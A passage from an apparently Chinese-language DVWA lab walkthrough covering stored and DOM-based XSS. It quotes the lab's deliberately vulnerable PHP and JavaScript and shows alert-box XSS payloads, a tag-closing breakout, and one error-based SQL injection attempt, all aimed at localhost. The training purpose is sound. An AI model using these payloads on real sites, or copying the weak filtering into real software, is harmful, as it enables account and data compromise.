class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.1b3kejqufvwg.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.5umj6bzmf2g0.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230708/St2iv8rimage.2kb9wpckvko0.png"></p><h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><p>试了一下<code>RXSS</code>的payload，都注不进去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看源码之后对<code>message</code>过滤拉满，但是丝<code>name</code>只防护了用了RXSS中的中等防护，所以我们这次的注入点放在<code>name</code>中，但是发现name注入长度只有10个，但是我们明显发现后端数据库没有限制长度，所以我们可以直接修改前端从而实现注入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><p>同样用Medium的方式，对name的防护措施同RXSS的High难度</p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><p>先猜测一波，我感觉只要对两个注入点都同时进行防xss注入操作就可以，或者后端限制长度。</p><p>揭晓答案看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"><span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize message input</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$message</span> );</span><br><span class="line"><span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize name input</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$name</span> );</span><br><span class="line"><span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:name&#x27;</span>, <span class="variable">$name</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"><span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然是这样，而且在对数据库操作的时候也进行了防注入设置。突然想到这low难度，貌似没有对相对的SQL语句进行过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br></pre></td></tr></table></figure><p>我试过一些payload比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or extractvalue(1,concat(0x7e,(database()),0x7e)) or &#x27;</span><br><span class="line">---------------达成效果---------------</span><br><span class="line">INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;&#x27; or extractvalue(1,concat(0x7e,(database()),0x7e)) or &#x27;&#x27;, &#x27;$name&#x27; );</span><br></pre></td></tr></table></figure><p>但是页面并没有出现显示数据库的信息，不知道是为什么，难道是因为没有显示位？不管啦，这里是XSS的主场！</p><h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS (DOM)"></a>XSS (DOM)</h1><p>好多语法知识需要补充/(ㄒoㄒ)/~~</p><blockquote><p>首先你得知道什么是HTML DOM：<a class="link" href="https://www.runoob.com/htmldom/htmldom-tutorial.html">点此跳转<i class="fas fa-external-link-alt"></i></a></p><p>DOM 是 Document Object Model（文档对象模型）的缩写。</p><p>HTML DOM 是关于如何获取、修改、添加或删除 HTML 元素的标准。</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.30fiulmr2o60.png"></p><h2 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2><p>后端啥防护也没有，也就是本题考点在前端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前端：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vulnerable_code_area&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) </span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> lang =<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;    </span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;English&quot;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;French&quot;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Spanish&quot;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;German&quot;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    这里的 <code>lang</code> 变量通过 <code>document.location.href</code> 也就是此时的URL中的<code>?default=</code>后面的内容来获取，并且没有任何过滤就直接 URL 解码后输出在了 <code>option</code> 标签中</p><blockquote><p><code>&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;</code>：一个 <code>&lt;form&gt;</code> 元素，其中 <code>name</code> 属性设置为 “XSS”，<code>method</code> 属性设置为 “GET”。这个表单用于向服务器发送数据，使用 GET 方法进行提交。</p><p><code>&lt;select name=&quot;default&quot;&gt;</code>：一个 <code>&lt;select&gt;</code> 元素，其中 <code>name</code> 属性设置为 “default”。这是一个下拉选择框，用于用户选择默认值。</p><p><code>if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) ...</code>：这是一个条件语句，用于检查当前页面 URL 中是否包含字符串 “default=”。<code>document.location.href</code> 表示当前页面的 URL。如果 URL 中包含 “default=”，则执行接下来的代码。</p><p><code>var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;) + 8);</code>：这行代码用于从 URL 中提取 “default=” 后面的值，即参数值。<code>substring()</code> 方法用于从字符串中提取指定索引范围的子字符串。这里使用 <code>indexOf(&quot;default=&quot;) + 8</code> 作为起始索引，加 8 是为了跳过 “default=” 的长度，从参数值开始提取。</p><p><code>document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</code>：这行代码使用 <code>document.write()</code> 方法将生成的 <code>&lt;option&gt;</code> 元素写入文档。它创建了一个包含选项值和显示文本的 <code>&lt;option&gt;</code> 元素，并使用 <code>lang</code> 变量作为值和显示文本。<code>decodeURI()</code> 函数用于解码可能存在的 URL 编码字符。</p><p><code>document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;);</code>：这行代码用于生成一个禁用的占位选项，显示为 “—-“。它被用作默认选项之前的分隔线或占位符。</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.7kxqmj67lgk0.png"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">indexOf</span>(<span class="string">&quot;Hello&quot;</span>)); <span class="comment">// 输出 0，因为 &quot;Hello&quot; 在索引 0 处匹配</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">indexOf</span>(<span class="string">&quot;world&quot;</span>)); <span class="comment">// 输出 7，因为 &quot;world&quot; 在索引 7 处匹配</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">indexOf</span>(<span class="string">&quot;foo&quot;</span>)); <span class="comment">// 输出 -1，因为 &quot;foo&quot; 没有匹配</span></span><br></pre></td></tr></table></figure><p>当我点击了Select按钮后，URL变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/xss_d/?default=English</span><br></pre></td></tr></table></figure><p>我们在其中注入我们的XSS代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/xss_d/?default=English &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以发现已经注入成功：<br><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.29jbrv8qcwlc.png"></p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/xss_d/?default=English &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如此注入后并没有成功，我猜测应该是后端过滤了，试试绕过发现大写绕过和嵌套绕过都不行，但是使用&lt;img可以，却只存在前端里面没有弹窗，为什么呢？看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"><span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line"><span class="comment"># Do not allow script tags</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>stripos($default, &quot;&lt;script&quot;)</code>：<code>stripos()</code> 是一个 PHP 函数，用于在字符串中查找子字符串的第一次出现的位置（不区分大小写）。在这里，它被用于检查变量 <code>$default</code> 是否包含子字符串 <code>&quot;&lt;script&quot;</code>。如果找到匹配，将返回匹配的起始位置；如果未找到匹配，将返回 <code>false</code>。</p><p><code>header(&quot;location: ?default=English&quot;);</code>：<code>header()</code> 是 PHP 中用于发送原始 HTTP 标头的函数。在这里，它用于执行重定向操作，将用户的请求重定向到指定的 URL（在这里是 <code>?default=English</code>）。这会将用户的浏览器重定向到另一个页面。</p></blockquote><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">----------注入----------</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line">----------达成效果----------</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;English%20%3Cimg%20src=x%20onerror=alert(%27XSS%27)%3E&quot;</span>&gt;</span>English <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">disabled</span>=<span class="string">&quot;disabled&quot;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 这里不知道为什么使用&lt;img&gt;就不能写进去 --&gt;</span></span><br><span class="line">----------并没有成功，当我们重新输入：----------</span><br><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line">----------达成效果----------</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;English &lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;&quot;</span>&gt;</span>English <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">disabled</span>=<span class="string">&quot;disabled&quot;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/xss_d/?default=English &lt;/option&gt;&lt;/select&gt;&lt;img src=x 